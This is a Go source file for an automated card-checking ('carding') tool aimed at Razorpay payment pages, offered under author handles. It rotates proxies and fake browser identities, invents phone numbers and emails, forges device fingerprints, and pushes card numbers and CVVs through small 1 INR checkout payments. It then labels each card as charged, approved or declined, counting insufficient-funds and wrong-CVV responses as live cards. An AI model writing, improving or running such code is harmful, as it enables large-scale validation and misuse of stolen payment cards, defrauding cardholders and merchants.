package main

import (
	"crypto/rand"
	"crypto/sha1"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
//  Modified for Railway.app + sites.txt support
// ──────────────────────────────────────────────────────────────────────────────

const (
	BUILD    = "9cb57fdf457e44eac4384e182f925070ff5488d9"
	BUILD_V1 = "715e3c0a534a4e4fa59a19e1d2a3cc3daf1837e2"
	PORT     = 7070
)

var (
	razorpayURLs []string
	urlIndex     uint64
	proxyIndex   uint64

	// High-load protection
	maxConcurrentChecks = 120 // Tune this based on Railway resources (80-200 is good)
	checkSemaphore      = make(chan struct{}, maxConcurrentChecks)

	// Safe concurrent writes to live.txt
	liveLogMutex sync.Mutex
)

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func getNextURL() string {
	if len(razorpayURLs) == 0 {
		return "https://pages.razorpay.com/lckuk-international"
	}
	idx := atomic.AddUint64(&urlIndex, 1) - 1
	return razorpayURLs[idx%uint64(len(razorpayURLs))]
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func formatProxy(raw string) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return ""
	}
	if strings.Contains(raw, "://") {
		return raw
	}
	parts := strings.Split(raw, ":")
	if len(parts) == 4 {
		return fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
	}
	return "http://" + raw
}

func loadProxies(filepath string) []string {
	var proxies []string
	data, err := os.ReadFile(filepath)
	if err != nil {
		return proxies
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		formatted := formatProxy(line)
		if formatted != "" {
			proxies = append(proxies, formatted)
		}
	}
	return proxies
}

func getNextProxy(proxyList []string) string {
	if len(proxyList) == 0 {
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) - 1
	return proxyList[idx%uint64(len(proxyList))]
}

// NEW: Load Razorpay URLs from sites.txt (supports comments with #)
func loadSites(filepath string) []string {
	var sites []string
	data, err := os.ReadFile(filepath)
	if err != nil {
		return sites
	}
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.HasPrefix(line, "http://") || strings.HasPrefix(line, "https://") {
			sites = append(sites, line)
		}
	}
	return sites
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return int(n.Int64()) + min
}

func genUA() string {
	major := randInt(120, 147)
	build := randInt(5000, 6999)
	patch := randInt(50, 249)
	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", major, build, patch)
}

func genIndianPhone() string {
	first := []string{"6", "7", "8", "9"}[randInt(0, 3)]
	rest := ""
	for i := 0; i < 9; i++ {
		rest += strconv.Itoa(randInt(0, 9))
	}
	return "+91" + first + rest
}

func genEmail() string {
	names := []string{"alex", "john", "mike", "sara", "david", "emma", "james", "lisa", "chris", "anna"}
	return names[randInt(0, len(names)-1)] + strconv.Itoa(randInt(100, 9999)) + "@gmail.com"
}

func getBrand(cc string) string {
	if strings.HasPrefix(cc, "4") {
		return "visa"
	}
	if len(cc) >= 2 {
		switch cc[:2] {
		case "51", "52", "53", "54", "55":
			return "mastercard"
		case "34", "37":
			return "amex"
		}
	}
	if strings.HasPrefix(cc, "6011") || strings.HasPrefix(cc, "65") {
		return "discover"
	}
	return "unknown"
}

func findBetween(content, start, end string) string {
	si := strings.Index(content, start)
	if si == -1 {
		return ""
	}
	si += len(start)
	ei := strings.Index(content[si:], end)
	if ei == -1 {
		return ""
	}
	return content[si : si+ei]
}

// extractJSONVar uses brace counting instead of regex — Go's RE2 does NOT
// backtrack like PHP's PCRE, so `[\s\S]*?` stops at the first `}` (which is
// inside a nested object), producing truncated/corrupt JSON.
func extractJSONVar(content, varName string) string {
	prefix := "var " + varName + " ="
	startIdx := strings.Index(content, prefix)
	if startIdx == -1 {
		return ""
	}
	startIdx += len(prefix)

	// skip whitespace
	for startIdx < len(content) {
		c := content[startIdx]
		if c != ' ' && c != '\t' && c != '\n' && c != '\r' {
			break
		}
		startIdx++
	}

	if startIdx >= len(content) || content[startIdx] != '{' {
		return ""
	}

	depth := 0
	inString := false
	escaped := false

	for i := startIdx; i < len(content); i++ {
		c := content[i]

		if escaped {
			escaped = false
			continue
		}
		if c == '\\' && inString {
			escaped = true
			continue
		}
		if c == '"' {
			inString = !inString
			continue
		}
		if inString {
			continue
		}
		if c == '{' {
			depth++
		} else if c == '}' {
			depth--
			if depth == 0 {
				return content[startIdx : i+1]
			}
		}
	}
	return ""
}

func generateRzpDeviceID() (string, string) {
	buf := make([]byte, 16)
	rand.Read(buf)
	h := sha1.Sum(buf)
	hStr := hex.EncodeToString(h[:])
	ts := strconv.FormatInt(time.Now().UnixMilli(), 10)
	rnd := fmt.Sprintf("%08d", randInt(0, 99999999))
	return fmt.Sprintf("1.%s.%s.%s", hStr, ts, rnd), hStr
}

func generateRzpSessionID() string {
	const base62 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	buf := make([]byte, 14)
	for i := 0; i < 14; i++ {
		n, _ := rand.Int(rand.Reader, big.NewInt(62))
		buf[i] = base62[n.Int64()]
	}
	return string(buf)
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

type FetchResponse struct {
	Body       string
	StatusCode int
	Headers    http.Header
}

func (r *FetchResponse) Text() string {
	return r.Body
}

func (r *FetchResponse) JSON() (map[string]interface{}, error) {
	var result map[string]interface{}
	err := json.Unmarshal([]byte(r.Body), &result)
	return result, err
}

type CustomFetch struct {
	client *http.Client
	ua     string
}

func NewCustomFetch(proxyURL, ua string) (*CustomFetch, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	transport := &http.Transport{
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:          200,
		MaxIdleConnsPerHost:   50,
		MaxConnsPerHost:       100,
		IdleConnTimeout:       90 * time.Second,
		DisableCompression:    false,
		DisableKeepAlives:     false,
		ExpectContinueTimeout: 1 * time.Second,
	}

	if proxyURL != "" {
		parsed, err := url.Parse(proxyURL)
		if err != nil {
			return nil, fmt.Errorf("invalid proxy url: %w", err)
		}
		transport.Proxy = http.ProxyURL(parsed)
	}

	client := &http.Client{
		Transport: transport,
		Jar:       jar,
		Timeout:   30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return errors.New("too many redirects")
			}
			return nil
		},
	}

	if ua == "" {
		ua = genUA()
	}

	return &CustomFetch{client: client, ua: ua}, nil
}

func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[string]string, body io.Reader) (*FetchResponse, error) {
	var reqBody io.Reader = body
	if reqBody == nil && method == "POST" {
		reqBody = strings.NewReader("")
	}

	req, err := http.NewRequest(method, targetURL, reqBody)
	if err != nil {
		return nil, err
	}

	if _, ok := headers["User-Agent"]; !ok {
		req.Header.Set("User-Agent", f.ua)
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := f.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return &FetchResponse{
		Body:       string(respBody),
		StatusCode: resp.StatusCode,
		Headers:    resp.Header,
	}, nil
}

func (f *CustomFetch) Get(targetURL string, headers map[string]string) (*FetchResponse, error) {
	return f.DoFetch(targetURL, "GET", headers, nil)
}

func (f *CustomFetch) PostJSON(targetURL string, headers map[string]string, payload interface{}) (*FetchResponse, error) {
	jsonBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["Content-Type"]; !ok {
		if _, ok2 := headers["Content-type"]; !ok2 {
			if _, ok3 := headers["content-type"]; !ok3 {
				headers["Content-Type"] = "application/json"
			}
		}
	}
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(string(jsonBytes)))
}

func (f *CustomFetch) PostForm(targetURL string, headers map[string]string, formData url.Values) (*FetchResponse, error) {
	if headers == nil {
		headers = make(map[string]string)
	}
	if _, ok := headers["Content-Type"]; !ok {
		if _, ok2 := headers["Content-type"]; !ok2 {
			if _, ok3 := headers["content-type"]; !ok3 {
				headers["Content-Type"] = "application/x-www-form-urlencoded"
			}
		}
	}
	return f.DoFetch(targetURL, "POST", headers, strings.NewReader(formData.Encode()))
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

type CheckResult struct {
	Status      string `json:"status"`
	Message     string `json:"response"`
	Proxy       string `json:"proxy"`
	ProxyStatus string `json:"proxy_status"`
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func checkCard(cc, mm, yy, cvv, proxyURL, targetURL string) CheckResult {
	yy2 := yy
	if len(yy) == 4 {
		yy2 = yy[2:]
	}
	year, _ := strconv.Atoi("20" + yy2)
	brand := getBrand(cc)
	ua := genUA()
	phone := genIndianPhone()
	phoneShort := phone[3:]
	email := genEmail()

	rzpDeviceID, fhash := generateRzpDeviceID()
	rzpSessionID := generateRzpSessionID()

	fetch, err := NewCustomFetch(proxyURL, ua)
	if err != nil {
		return CheckResult{Status: "error", Message: truncate(err.Error(), 120), Proxy: proxyURL, ProxyStatus: "DEAD"}
	}
	defer fetch.client.CloseIdleConnections()

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

	r1, err := fetch.Get(targetURL, map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5",
	})
	if err != nil {
		return makeProxyError(err, proxyURL)
	}
	r1Text := r1.Text()

	// Use brace-counting parser instead of regex
	jsonStr := extractJSONVar(r1Text, "data")
	if jsonStr == "" {
		return CheckResult{Status: "error", Message: "Failed to locate Razorpay data on page", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	var initData map[string]interface{}
	if err := json.Unmarshal([]byte(jsonStr), &initData); err != nil {
		var inner string
		if err2 := json.Unmarshal([]byte(jsonStr), &inner); err2 == nil {
			if err3 := json.Unmarshal([]byte(inner), &initData); err3 != nil {
				return CheckResult{Status: "error", Message: "Failed to parse Razorpay JSON data", Proxy: proxyURL, ProxyStatus: "LIVE"}
			}
		} else {
			return CheckResult{Status: "error", Message: "Failed to parse Razorpay JSON data: " + truncate(err.Error(), 80), Proxy: proxyURL, ProxyStatus: "LIVE"}
		}
	}

	kyid := getStringFromMap(initData, "key_id")
	if kyid == "" {
		kyid = getStringFromMap(initData, "key")
	}
	if kyid == "" {
		return CheckResult{Status: "error", Message: "Razorpay Key ID not found", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	var plink, ppid string
	// Force 1 INR (100 paise) — never use 0 from potentially missing JSON fields
	const forceAmount float64 = 100

	if plObj, ok := initData["payment_link"].(map[string]interface{}); ok {
		plink = getStringFromMap(plObj, "id")
		if items, ok2 := plObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getStringFromMap(item, "id")
			}
		}
	} else if ppObj, ok := initData["payment_page"].(map[string]interface{}); ok {
		plink = getStringFromMap(ppObj, "id")
		if items, ok2 := ppObj["payment_page_items"].([]interface{}); ok2 && len(items) > 0 {
			if item, ok3 := items[0].(map[string]interface{}); ok3 {
				ppid = getStringFromMap(item, "id")
			}
		}
	}

	if plink == "" {
		return CheckResult{Status: "error", Message: "Payment Link ID not found in page structure", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	keylessHeader := getStringFromMap(initData, "keyless_header")
	keylessHeaderURL := url.QueryEscape(keylessHeader)

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

	r2Payload := map[string]interface{}{
		"notes":      map[string]string{"comment": "", "name": "User"},
		"line_items": []map[string]interface{}{{"payment_page_item_id": ppid, "amount": forceAmount}},
	}

	r2, err := fetch.PostJSON(
		fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", plink),
		map[string]string{
			"Accept":       "application/json, text/plain, */*",
			"Content-Type": "application/json",
			"Origin":       "https://pages.razorpay.com",
			"Referer":      "https://pages.razorpay.com/",
		},
		r2Payload,
	)
	if err != nil {
		return makeProxyError(err, proxyURL)
	}

	var r2Data map[string]interface{}
	if err := json.Unmarshal([]byte(r2.Text()), &r2Data); err != nil {
		return CheckResult{Status: "error", Message: "Order response parse failed: " + truncate(err.Error(), 80), Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	orderObj, _ := r2Data["order"].(map[string]interface{})
	orderID := getStringFromMap(orderObj, "id")
	if orderID == "" {
		errMsg := "Order creation failed"
		if e, ok := r2Data["error"].(map[string]interface{}); ok {
			desc := getStringFromMap(e, "description")
			if desc != "" {
				errMsg = desc
			}
		}
		return CheckResult{Status: "error", Message: errMsg, Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	checkoutID := orderID
	if idx := strings.Index(orderID, "_"); idx != -1 {
		checkoutID = orderID[idx+1:]
	}

	orderAmount := getFloatFromMap(orderObj, "amount")
	if orderAmount < 100 {
		orderAmount = forceAmount
	}
	orderCurrency := getStringFromMap(orderObj, "currency")
	if orderCurrency == "" {
		orderCurrency = "INR"
	}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

	params3 := url.Values{
		"traffic_env":        {"production"},
		"build":              {BUILD},
		"build_v1":           {BUILD_V1},
		"checkout_v2":        {"1"},
		"new_session":        {"1"},
		"keyless_header":     {keylessHeader},
		"rzp_device_id":      {rzpDeviceID},
		"unified_session_id": {rzpSessionID},
	}

	r3, err := fetch.Get(
		"https://api.razorpay.com/v1/checkout/public?"+params3.Encode(),
		map[string]string{
			"Accept":  "text/html,application/xhtml+xml,*/*",
			"Referer": "https://pages.razorpay.com/",
		},
	)
	if err != nil {
		return makeProxyError(err, proxyURL)
	}
	r3Text := r3.Text()

	sessid := findBetween(r3Text, `window.session_token="`, `";`)
	if sessid == "" {
		re := regexp.MustCompile(`session_token['"]?\s*[:=]\s*['"]([A-F0-9]{40,})['"]`)
		m := re.FindStringSubmatch(r3Text)
		if len(m) >= 2 {
			sessid = m[1]
		}
	}
	if sessid == "" {
		return CheckResult{Status: "error", Message: "Session token not found", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	rzpRef := fmt.Sprintf("https://api.razorpay.com/v1/checkout/public?traffic_env=production&build=%s&build_v1=%s&checkout_v2=1&new_session=1&unified_session_id=%s&session_token=%s",
		BUILD, BUILD_V1, rzpSessionID, sessid)

	stdHeaders := func() map[string]string {
		return map[string]string{
			"Accept":          "*/*",
			"Origin":          "https://api.razorpay.com",
			"Referer":         rzpRef,
			"x-session-token": sessid,
		}
	}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

	{
		resources := []string{"checkout_version_config", "merchant", "merchant_features", "downtime", "customer", "customer_tokens", "truecaller", "methods", "experiments", "offers", "checkout_config", "order", "invoice", "buyer_protection", "personalization"}
		queryArr := make([]map[string]string, 0, len(resources))
		for _, r := range resources {
			queryArr = append(queryArr, map[string]string{"resource": r})
		}

		r4Payload := map[string]interface{}{
			"query": queryArr,
			"query_params": map[string]interface{}{
				"device_id":       rzpDeviceID,
				"rtb_device_id":   fhash,
				"amount":          orderAmount,
				"currency":        orderCurrency,
				"option_currency": orderCurrency,
				"truecaller":      false,
				"qr_required":     false,
				"library":         "checkoutjs",
				"platform":        "browser",
				"order_id":        orderID,
				"payment_link_id": plink,
				"contact":         phone,
			},
			"action": "get",
		}

		h := stdHeaders()
		h["Content-Type"] = "application/json"
		fetch.PostJSON(
			fmt.Sprintf("https://api.razorpay.com/v2/standard_checkout/preferences?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeader),
			h, r4Payload,
		)
	}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

	{
		form5 := url.Values{
			"notes[email]":          {email},
			"notes[phone]":          {phoneShort},
			"payment_link_id":       {plink},
			"key_id":                {kyid},
			"contact":               {phone},
			"email":                 {email},
			"currency":              {orderCurrency},
			"_[integration]":        {"payment_pages"},
			"_[device.id]":          {rzpDeviceID},
			"_[library]":            {"checkoutjs"},
			"_[library_src]":        {"no-src"},
			"_[current_script_src]": {"no-src"},
			"_[platform]":           {"browser"},
			"_[env]":                {""},
			"_[is_magic_script]":    {"false"},
			"_[os]":                 {"windows"},
			"_[shield][fhash]":      {fhash},
			"_[shield][tz]":         {"0"},
			"_[device_id]":          {rzpDeviceID},
			"_[build]":              {BUILD},
			"_[shield][os]":         {"windows"},
			"_[shield][platform]":   {"browser"},
			"_[shield][browser]":    {"chrome"},
			"_[request_index]":      {"0"},
			"amount":                {fmt.Sprintf("%.0f", orderAmount)},
			"order_id":              {orderID},
			"method":                {"card"},
			"checkout_id":           {checkoutID},
		}

		h := stdHeaders()
		h["Content-Type"] = "application/x-www-form-urlencoded"
		fetch.PostForm(
			fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/checkout/order?key_id=%s&session_token=%s&keyless_header=%s", kyid, sessid, keylessHeader),
			h, form5,
		)
	}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

	{
		r6Payload := map[string]interface{}{
			"identifiers": map[string]interface{}{
				"merchant":         map[string]string{"country": "IN"},
				"card":             map[string]interface{}{"country": "US", "dcc_blacklist": false, "network": brand},
				"method":           "card",
				"payment_currency": orderCurrency,
			},
			"forex_charges": map[string]interface{}{
				"amount":   orderAmount,
				"currency": orderCurrency,
				"filters":  map[string]string{"method": "card"},
			},
		}

		h := stdHeaders()
		h["Content-Type"] = "application/json"
		fetch.PostJSON(
			fmt.Sprintf("https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows?x_entity_id=%s&keyless_header=%s", orderID, keylessHeaderURL),
			h, r6Payload,
		)
	}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))

	form7 := url.Values{
		"user_risk_providers_token": {tokenCreate},
		"notes[comment]":            {""},
		"notes[email]":              {email},
		"notes[phone]":              {phoneShort},
		"notes[name]":               {"User"},
		"payment_link_id":           {plink},
		"key_id":                    {kyid},
		"contact":                   {phone},
		"email":                     {email},
		"currency":                  {orderCurrency},
		"_[integration]":            {"payment_pages"},
		"_[checkout_id]":            {checkoutID},
		"_[device.id]":              {rzpDeviceID},
		"_[env]":                    {""},
		"_[library]":                {"checkoutjs"},
		"_[library_src]":            {"no-src"},
		"_[current_script_src]":     {"no-src"},
		"_[is_magic_script]":        {"false"},
		"_[platform]":               {"browser"},
		"_[referer]":                {targetURL},
		"_[shield][fhash]":          {fhash},
		"_[shield][tz]":             {"-330"},
		"_[device_id]":              {rzpDeviceID},
		"_[build]":                  {BUILD},
		"_[shield][os]":             {"windows"},
		"_[shield][platform]":       {"browser"},
		"_[shield][browser]":        {"chrome"},
		"_[request_index]":          {"1"},
		"amount":                    {fmt.Sprintf("%.0f", orderAmount)},
		"order_id":                  {orderID},
		"method":                    {"card"},
		"card[number]":              {cc},
		"card[cvv]":                 {cvv},
		"card[name]":                {"User"},
		"card[expiry_month]":        {mm},
		"card[expiry_year]":         {strconv.Itoa(year)},
		"save":                      {"0"},
		"dcc_currency":              {orderCurrency},
	}

	r7, err := fetch.PostForm(
		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeader),
		stdHeaders(),
		form7,
	)
	if err != nil {
		return makeProxyError(err, proxyURL)
	}

	var r7Data map[string]interface{}
	if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
		return CheckResult{Status: "error", Message: "Payment create response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	paymentID := getStringFromMap(r7Data, "payment_id")
	if paymentID == "" {
		paymentID = getStringFromMap(r7Data, "id")
	}

	if paymentID == "" {
		errObj, _ := r7Data["error"].(map[string]interface{})
		errDesc := getStringFromMap(errObj, "description")
		errDesc = strings.ReplaceAll(errDesc, " Try another payment method or contact your bank for details.", "")
		errDesc = strings.TrimSpace(errDesc)
		errCode := getStringFromMap(errObj, "reason")

		label := errDesc
		if errCode != "" {
			label = errDesc + " (" + errCode + ")"
		}

		msgLower := strings.ToLower(errDesc)
		if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
			return CheckResult{Status: "approved", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
		}
		return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

	pidClean := paymentID
	if idx := strings.Index(paymentID, "_"); idx != -1 {
		pidClean = paymentID[idx+1:]
	}

	{
		fetch.PostForm(
			fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", paymentID),
			map[string]string{"content-type": "application/x-www-form-urlencoded"},
			url.Values{},
		)
	}

	time.Sleep(1 * time.Second)

	{
		screens := [][]int{{1920, 1080}, {1366, 768}, {1536, 864}, {1440, 900}}
		screen := screens[randInt(0, len(screens)-1)]
		depths := []int{24, 32}
		depth := depths[randInt(0, 1)]

		form8 := url.Values{
			"browser[java_enabled]":       {"false"},
			"browser[javascript_enabled]": {"true"},
			"browser[timezone_offset]":    {"0"},
			"browser[color_depth]":        {strconv.Itoa(depth)},
			"browser[screen_width]":       {strconv.Itoa(screen[0])},
			"browser[screen_height]":      {strconv.Itoa(screen[1])},
			"browser[language]":           {"en-US"},
			"auth_step":                   {"3ds2Auth"},
		}

		fetch.PostForm(
			fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", pidClean),
			map[string]string{"content-type": "application/x-www-form-urlencoded"},
			form8,
		)
	}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

	r9, err := fetch.Get(
		fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?key_id=%s&session_token=%s&keyless_header=%s", paymentID, kyid, sessid, keylessHeader),
		map[string]string{
			"Accept":          "*/*",
			"Content-type":    "application/x-www-form-urlencoded",
			"Referer":         rzpRef,
			"x-session-token": sessid,
		},
	)
	if err != nil {
		return makeProxyError(err, proxyURL)
	}

	var r9Data map[string]interface{}
	if err := json.Unmarshal([]byte(r9.Text()), &r9Data); err != nil {
		return CheckResult{Status: "declined", Message: "Cancel response parse failed", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	finalText := r9.Text()

	if strings.Contains(finalText, "razorpay_payment_id") {
		return CheckResult{Status: "charged", Message: "Payment Successful", Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	errorObj, _ := r9Data["error"].(map[string]interface{})
	errorDesc := getStringFromMap(errorObj, "description")
	errorDesc = strings.ReplaceAll(errorDesc, " Try another payment method or contact your bank for details.", "")
	errorDesc = strings.TrimSpace(errorDesc)
	errCode := getStringFromMap(errorObj, "reason")

	label := errorDesc
	if errCode != "" {
		label = errorDesc + " (" + errCode + ")"
	}
	if label == "" {
		label = "Unknown Decline"
	}

	msgLower := strings.ToLower(errorDesc)
	if isBalanceKeyword(msgLower) || isCVVKeyword(msgLower, errCode) {
		return CheckResult{Status: "approved", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
	}

	return CheckResult{Status: "declined", Message: label, Proxy: proxyURL, ProxyStatus: "LIVE"}
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func getStringFromMap(m map[string]interface{}, key string) string {
	if m == nil {
		return ""
	}
	v, ok := m[key]
	if !ok {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

func getFloatFromMap(m map[string]interface{}, key string) float64 {
	if m == nil {
		return 0
	}
	v, ok := m[key]
	if !ok {
		return 0
	}
	switch val := v.(type) {
	case float64:
		return val
	case int:
		return float64(val)
	case int64:
		return float64(val)
	case string:
		f, _ := strconv.ParseFloat(val, 64)
		return f
	}
	return 0
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen]
}

var balanceKeywords = []string{
	"insufficient account balance",
	"insufficient funds",
	"maximum transaction limit",
	"transaction limit exceeded",
}

func isBalanceKeyword(msgLower string) bool {
	for _, k := range balanceKeywords {
		if strings.Contains(msgLower, k) {
			return true
		}
	}
	return false
}

func isCVVKeyword(msgLower, errCode string) bool {
	if strings.Contains(msgLower, "cvv provided is incorrect") {
		return true
	}
	if strings.Contains(msgLower, "ncorrect_cvv") {
		return true
	}
	if strings.ToLower(errCode) == "incorrect_cvv" {
		return true
	}
	return false
}

var proxyErrorKeywords = []string{
	"ECONNREFUSED", "ECONNRESET", "ETIMEDOUT", "ENOTFOUND",
	"CURLE_COULDNT_RESOLVE_PROXY", "CURLE_COULDNT_CONNECT",
	"CURLE_OPERATION_TIMEOUTED", "CURLE_PROXY",
	"socket hang up", "HPE_INVALID", "fetch failed",
	"no such host", "connection refused", "connection reset",
	"i/o timeout", "timeout", "proxyconnect",
}

func makeProxyError(err error, proxyURL string) CheckResult {
	msg := truncate(err.Error(), 120)
	msgUpper := strings.ToUpper(msg)
	isProxyErr := false
	for _, k := range proxyErrorKeywords {
		if strings.Contains(msgUpper, strings.ToUpper(k)) {
			isProxyErr = true
			break
		}
	}
	status := "LIVE"
	if isProxyErr {
		status = "DEAD"
	}
	return CheckResult{Status: "error", Message: msg, Proxy: proxyURL, ProxyStatus: status}
}

func maskProxy(proxyURL, proxyStatus string) string {
	if proxyURL == "" {
		return "DIRECT [" + proxyStatus + "]"
	}
	parsed, err := url.Parse(proxyURL)
	if err == nil && parsed.Host != "" {
		return parsed.Scheme + "//" + parsed.Host + " [" + proxyStatus + "]"
	}
	masked := regexp.MustCompile(`//[^@]+@`).ReplaceAllString(proxyURL, "//***@")
	return masked + " [" + proxyStatus + "]"
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

type ParsedCard struct {
	CC, MM, YY, CVV string
}

func parseCard(cardData string) (*ParsedCard, error) {
	cardData = strings.TrimSpace(cardData)
	separators := []string{"|", "/", " "}

	for _, sep := range separators {
		parts := strings.Split(cardData, sep)
		if len(parts) >= 4 {
			cc := strings.TrimSpace(parts[0])
			mm := strings.TrimSpace(parts[1])
			yy := strings.TrimSpace(parts[2])
			cvv := strings.TrimSpace(parts[3])

			if isDigits(cc) && isDigitsMM(mm) && isDigitsYY(yy) && isDigitsCVV(cvv) {
				mmInt, _ := strconv.Atoi(mm)
				if len(cc) >= 13 && len(cc) <= 19 && mmInt >= 1 && mmInt <= 12 {
					return &ParsedCard{
						CC:  cc,
						MM:  fmt.Sprintf("%02d", mmInt),
						YY:  yy,
						CVV: cvv,
					}, nil
				}
			}
		}
	}
	return nil, errors.New("invalid card format")
}

func isDigits(s string) bool {
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return len(s) > 0
}

func isDigitsMM(s string) bool {
	return isDigits(s) && (len(s) == 1 || len(s) == 2)
}

func isDigitsYY(s string) bool {
	return isDigits(s) && (len(s) == 2 || len(s) == 4)
}

func isDigitsCVV(s string) bool {
	return isDigits(s) && (len(s) == 3 || len(s) == 4)
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
